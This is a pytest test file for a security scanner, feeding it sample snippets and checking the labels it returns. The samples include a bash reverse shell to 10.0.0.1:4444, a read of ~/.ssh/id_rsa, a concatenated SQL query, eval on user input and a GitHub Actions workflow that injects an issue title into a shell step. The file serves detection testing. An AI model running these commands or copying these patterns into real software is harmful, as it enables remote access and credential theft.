import pytest
from scripts.sec_scanner import scan_content


def test_scan_hardcoded_aws_secret():
    code = 'AWS_KEY = "AKIA1234567890ABCDEF"'
    findings = scan_content(code, filename="test.py")
    assert len(findings) == 1
    assert findings[0]["type"] == "SECRET"
    assert "AWS Access Key" in findings[0]["label"]


def test_scan_sql_injection():
    code = 'query = "SELECT * FROM users WHERE username = \'" + user_input + "\'"'
    findings = scan_content(code, filename="app.py")
    assert any("SQL Injection" in f["label"] for f in findings)


def test_scan_eval_code_execution():
    code = 'result = eval(user_payload)'
    findings = scan_content(code, filename="calc.py")
    assert any("eval/exec" in f["label"] for f in findings)


def test_scan_reverse_shell():
    code = 'os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")'
    findings = scan_content(code, filename="backdoor.py")
    assert any("Reverse Shell" in f["label"] for f in findings)


def test_scan_credential_file_access():
    code = 'with open("~/.ssh/id_rsa") as f: key = f.read()'
    findings = scan_content(code, filename="exfil.py")
    assert any("Credential File" in f["label"] for f in findings)


def test_scan_github_actions_context_injection():
    workflow_yaml = """
    name: Issue Responder
    on: issues
    jobs:
      reply:
        runs-on: ubuntu-latest
        steps:
          - run: echo "Title: ${{ github.event.issue.title }}"
    """
    findings = scan_content(workflow_yaml, filename=".github/workflows/issue.yml")
    assert any("GitHub Actions Script Injection" in f["label"] for f in findings)


def test_scan_clean_code():
    code = """
    import os
    db.query("SELECT * FROM users WHERE id = :id", {"id": user_id})
    """
    findings = scan_content(code, filename="clean.py")
    assert len(findings) == 0
